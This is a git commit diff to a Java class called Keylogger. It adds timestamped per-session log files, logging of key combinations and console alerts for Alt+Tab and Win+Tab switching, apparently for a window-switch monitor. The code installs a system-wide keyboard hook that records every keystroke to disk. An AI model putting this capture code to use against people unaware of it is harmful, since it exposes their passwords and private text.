3dfdcf9b4110696baebabd7d40d0a7213602155e
Alpha <syedaarishshah@gmail.com>
2023-08-08 18:23:00 +0530

    added tab switch detector

--- first_app/src/main/java/khushi/Keylogger.java
+++ first_app/src/main/java/khushi/Keylogger.java
@@ -4,7 +4,9 @@ package khushi;
 
 import java.time.LocalDateTime;
 import java.time.format.DateTimeFormatter;
-
+import java.util.HashSet;
+import java.util.Set;
+import java.io.File;
 import java.io.FileWriter;
 import java.io.IOException;
 
@@ -16,12 +18,30 @@ import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;
 public class Keylogger implements NativeKeyListener
 {
     private FileWriter output;
+    private Set<String> currentlyPressedKeys = new HashSet<>(); // to avoid duplicate key presses, same as sets in math
 
     public Keylogger()
     {
         try
         {
-            output = new FileWriter("keylog.txt", true); // true means the file is appended
+            // Formatting the current date and time. We can't use the fn below as it is of
+            // incorrect format.
+            LocalDateTime now = LocalDateTime.now();
+            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd-HH-mm-ss");
+            String dateTime = now.format(formatter);
+
+            // Constructing the directory path and filename
+            String directoryPath = "logs/";
+            String fileName = directoryPath + dateTime + "_keylog.txt";
+
+            // Checking if the directory exists. If not, create it.
+            File directory = new File(directoryPath);
+            if (!directory.exists())
+            {
+                directory.mkdirs();
+            }
+
+            output = new FileWriter(fileName, true); // true means the file is appended
         } catch (IOException e)
         {
             e.printStackTrace();
@@ -30,7 +50,7 @@ public class Keylogger implements NativeKeyListener
 
     public static void main(String[] args)
     {
-        System.out.println("Hello World!");
+        System.out.println("Keylogger started");
         try
         {
             GlobalScreen.registerNativeHook();
@@ -43,28 +63,38 @@ public class Keylogger implements NativeKeyListener
     @Override
     public void nativeKeyPressed(NativeKeyEvent arg0)
     {
+        String keyText = NativeKeyEvent.getKeyText(arg0.getKeyCode());
+        currentlyPressedKeys.add(keyText);
+        checkForKeyCombinations();
+
         String dateTime = getCurrentDateTime();
-        String keyText = dateTime + " - Pressed this key: " + NativeKeyEvent.getKeyText(arg0.getKeyCode()) + "\n";
-        System.out.println(keyText);
-        try
+
+        if (currentlyPressedKeys.size() > 1)// More than one key is pressed
         {
-            output.write(keyText);
-            output.flush();
-        } catch (IOException e)
+            String combinedKeys = String.join(" + ", currentlyPressedKeys);
+            String logText = dateTime + " - Combination of keys: " + combinedKeys + " has been pressed.\n";
+            System.out.println(logText);
+            writeToFile(logText);
+        } else
         {
-            e.printStackTrace();
+            String logText = dateTime + " - Pressed this key: " + keyText + "\n";
+            System.out.println(logText);
+            writeToFile(logText);
         }
     }
 
     @Override
     public void nativeKeyReleased(NativeKeyEvent arg0)
     {
-        String dateTime = getCurrentDateTime();
-        String keyText = dateTime + " - Released this key: " + NativeKeyEvent.getKeyText(arg0.getKeyCode()) + "\n";
-        System.out.println(keyText);
+        String keyText = NativeKeyEvent.getKeyText(arg0.getKeyCode());
+        currentlyPressedKeys.remove(keyText);
+    }
+
+    private void writeToFile(String text)
+    {
         try
         {
-            output.write(keyText);
+            output.write(text);
             output.flush();
         } catch (IOException e)
         {
@@ -77,6 +107,19 @@ public class Keylogger implements NativeKeyListener
         LocalDateTime now = LocalDateTime.now();
         DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
         return now.format(formatter);
+    }
+
+    private void checkForKeyCombinations()
+    {
+        if (currentlyPressedKeys.contains("Alt") && currentlyPressedKeys.contains("Tab"))
+        {
+            System.out.println("Combination of Alt + Tab keys have been used. User might have switched windows.");
+        } else if (currentlyPressedKeys.contains("Meta") && currentlyPressedKeys.contains("Tab"))
+        {
+            // The exact name for the Windows key might differ depending on the library and
+            // OS. It's often "Windows" or "Meta".
+            System.out.println("Combination of Win + Tab keys have been used. User might have switched windows.");
+        }
     }
 
 }
